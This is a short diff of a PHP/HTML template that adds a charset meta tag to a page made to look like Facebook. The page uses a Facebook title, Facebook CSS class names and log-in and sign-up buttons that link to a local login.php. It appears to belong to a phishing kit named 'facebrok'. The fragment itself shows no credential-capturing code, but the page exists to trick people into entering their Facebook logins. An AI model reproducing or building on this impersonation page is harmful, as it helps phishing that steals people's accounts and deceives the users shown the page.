@@ -22,5 +22,6 @@
     }
 </style>
 <title>nickimaj | Facebook</title>
+<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
 <link rel="shortcut icon" href="../dynamic/índice.ico" />
 <div class="_4-u2 _5hni _4-u8" id="u_0_5p" style="display: block;"><div class="_5hnk"><div class="_5hnl"><div class="_5hnm"><?php echo $facebrok->translater("see_nickimaj"); ?></div><div class="_5hnp"><?php echo $facebrok->translater("msg_nickimaj"); ?></div></div><br><div class="_5hnq"><a class="_42ft _4jy0 _4jy5 _517h _51sy" role="button" style=""><?php echo $facebrok->translater("sign_up"); ?></a><a class="_42ft _4jy0 _4jy5 _4jy1 selected _51sy" role="button" href="../login.php?login_attempt=1&lwv=1"><?php echo $facebrok->translater("log_in"); ?></a></div><a class="_3j0u" data-nocookies="1" id="u_0_5r"><?php echo $facebrok->translater("not_now"); ?></a></div></div>
